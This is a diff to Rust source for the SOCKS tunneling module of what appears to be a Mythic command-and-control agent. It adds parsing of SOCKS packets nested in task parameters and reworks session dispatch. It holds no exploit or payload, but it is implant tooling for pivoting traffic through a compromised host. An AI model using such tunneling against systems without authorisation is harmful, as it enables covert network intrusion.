@@ -53,6 +53,15 @@ fn hex_preview(data: &[u8], max: usize) -> String {
     s
 }
 
+fn str_preview(s: &str, max: usize) -> String {
+    let mut out = s.to_string();
+    if out.len() > max {
+        out.truncate(max);
+        out.push('…');
+    }
+    out
+}
+
 /* ------------------------------- SOCKS utils ------------------------------ */
 
 fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
@@ -137,6 +146,57 @@ fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
     }
 }
 
+/* ----------- Extract socks messages from continued_task.parameters --------- */
+
+/// Try to extract a SOCKS packet (server_id, data, exit) from an arbitrary Value.
+/// Supports two shapes:
+/// 1) Top-level socks packet: {"server_id": "...", "data": "...", "exit": bool}
+/// 2) AgentTask with JSON-string parameters containing the socks packet:
+///    {"command":"continued_task", "parameters":"{\"server_id\":\"...\",\"data\":\"...\",\"exit\":false}"}
+fn extract_socks_packet(msg: &Value) -> Result<Option<(String, bool, Value)>, Box<dyn Error>> {
+    // Case 1: top-level
+    if let Some(sid) = msg.get("server_id").and_then(|v| v.as_str()) {
+        let exit = msg.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
+        return Ok(Some((sid.to_string(), exit, msg.clone())));
+    }
+
+    // Case 2: AgentTask continued_task
+    if let Some(cmd) = msg.get("command").and_then(|v| v.as_str()) {
+        if cmd.eq_ignore_ascii_case("continued_task") {
+            if let Some(params_str) = msg.get("parameters").and_then(|v| v.as_str()) {
+                // parameters is a JSON-encoded string; parse it
+                match serde_json::from_str::<Value>(params_str) {
+                    Ok(inner) => {
+                        if let Some(sid) = inner.get("server_id").and_then(|v| v.as_str()) {
+                            let exit = inner.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
+                            return Ok(Some((sid.to_string(), exit, inner)));
+                        } else {
+                            // Could be a different nesting, log a tiny preview
+                            return Err(format!(
+                                "parsed parameters but no server_id. keys={:?}",
+                                inner.as_object().map(|o| o.keys().cloned().collect::<Vec<_>>())
+                            )
+                            .into());
+                        }
+                    }
+                    Err(e) => {
+                        return Err(format!(
+                            "failed to parse parameters as JSON: err={e}; preview={}",
+                            str_preview(params_str, 200)
+                        )
+                        .into());
+                    }
+                }
+            } else {
+                return Err("continued_task missing parameters string".into());
+            }
+        }
+    }
+
+    // Not a socks message we understand
+    Ok(None)
+}
+
 /* ----------------------------- Session handler ---------------------------- */
 
 async fn handle_connection(
@@ -152,7 +212,7 @@ async fn handle_connection(
         format!("server_id={server_id}"),
     );
 
-    // Expect initial CONNECT frame
+    // Expect initial CONNECT frame (as a socks packet forwarded by dispatcher)
     let first = match sess_rx.recv().await {
         Some(v) => v,
         None => {
@@ -297,24 +357,13 @@ async fn handle_connection(
     });
 
     // Mythic -> remote
-    // NOTE: CLONE these so we keep the originals for final stats below.
     let tx_for_m2a = tx_out.clone();
     let sid_for_m2a = server_id.clone();
     let parent_for_m2a = parent_task_id.clone();
     let dn_ctr = bytes_dn.clone();
     let m2a = tokio::spawn(async move {
         while let Some(msg) = sess_rx.recv().await {
-            let m_sid = msg["server_id"].as_str().unwrap_or("");
-            if m_sid != sid_for_m2a {
-                debug_to_mythic(
-                    &tx_for_m2a,
-                    &parent_for_m2a,
-                    "SOCKS stray message",
-                    format!("expected={sid_for_m2a}, got={m_sid}"),
-                );
-                continue;
-            }
-
+            // sess_rx already contains only socks packets for this session_id
             if msg["exit"].as_bool().unwrap_or(false) {
                 debug_to_mythic(
                     &tx_for_m2a,
@@ -350,7 +399,7 @@ async fn handle_connection(
     let _ = a2m.await;
     let _ = m2a.await;
 
-    // Final stats using the ORIGINALS (not moved into tasks)
+    // Final stats
     debug_to_mythic(
         &tx_out,
         &parent_task_id,
@@ -403,37 +452,54 @@ pub fn handle_socks(
 
         debug_to_mythic(&tx, &parent_task_id, "SOCKS dispatcher running", "awaiting messages from Mythic");
 
-        while let Some(msg) = bridge_rx.recv().await {
-            let server_id = match msg.get("server_id").and_then(|v| v.as_str()) {
-                Some(s) => s.to_string(),
-                None => {
-                    debug_to_mythic(&tx, &parent_task_id, "SOCKS dispatcher drop", "message missing server_id");
-                    continue;
-                }
-            };
-            let exit = msg.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
+        while let Some(raw_msg) = bridge_rx.recv().await {
+            match extract_socks_packet(&raw_msg) {
+                Ok(Some((server_id, exit, socks_msg))) => {
+                    // Lazily create a session for this server_id
+                    let entry = sessions.entry(server_id.clone()).or_insert_with(|| {
+                        let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
+                        let sid = server_id.clone();
+                        let tx_out = tx.clone();
+                        let parent_id = parent_task_id.clone();
 
-            let entry = sessions.entry(server_id.clone()).or_insert_with(|| {
-                let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
-                let sid = server_id.clone();
-                let tx_out = tx.clone();
-                let parent_id = parent_task_id.clone();
+                        debug_to_mythic(&tx_out, &parent_id, "SOCKS session spawn", format!("server_id={sid}"));
 
-                debug_to_mythic(&tx_out, &parent_id, "SOCKS session spawn", format!("server_id={sid}"));
+                        tokio::spawn(async move {
+                            if let Err(e) = handle_connection(parent_id, sid, sess_rx, tx_out).await {
+                                eprintln!("socks session ended with error: {e}");
+                            }
+                        });
+                        sess_tx
+                    });
 
-                tokio::spawn(async move {
-                    if let Err(e) = handle_connection(parent_id, sid, sess_rx, tx_out).await {
-                        eprintln!("socks session ended with error: {e}");
+                    // Forward the (possibly transformed) socks message to the session
+                    let _ = entry.send(socks_msg);
+
+                    // If this message indicates exit, drop the route
+                    if exit {
+                        sessions.remove(&server_id);
+                        debug_to_mythic(&tx, &parent_task_id, "SOCKS dispatcher removed session", format!("server_id={server_id}"));
                     }
-                });
-                sess_tx
-            });
-
-            let _ = entry.send(msg);
-
-            if exit {
-                sessions.remove(&server_id);
-                debug_to_mythic(&tx, &parent_task_id, "SOCKS dispatcher removed session", format!("server_id={server_id}"));
+                }
+                Ok(None) => {
+                    // Not a socks packet; log once in a while to avoid spam
+                    debug_to_mythic(
+                        &tx,
+                        &parent_task_id,
+                        "SOCKS dispatcher skip",
+                        "message not socks-related (no server_id / not continued_task)",
+                    );
+                }
+                Err(e) => {
+                    // We tried to parse parameters but failed; include a small preview
+                    let preview = raw_msg.get("parameters").and_then(|v| v.as_str()).map(|s| str_preview(s, 160)).unwrap_or_default();
+                    debug_to_mythic(
+                        &tx,
+                        &parent_task_id,
+                        "SOCKS dispatcher parse error",
+                        format!("err={e}; params_preview={preview}"),
+                    );
+                }
             }
         }
 
@@ -445,10 +511,9 @@ pub fn handle_socks(
 }
 
 /// Back-compat for existing call site in tasking.rs
-/// Back-compat for existing call site in tasking.rs
 pub fn setup_socks(
-    tx: &std_mpsc::Sender<serde_json::Value>,
-    rx: std_mpsc::Receiver<serde_json::Value>,
+    tx: &std_mpsc::Sender<Value>,
+    rx: std_mpsc::Receiver<Value>,
 ) -> Result<(), Box<dyn Error>> {
     handle_socks(tx, rx)
 }
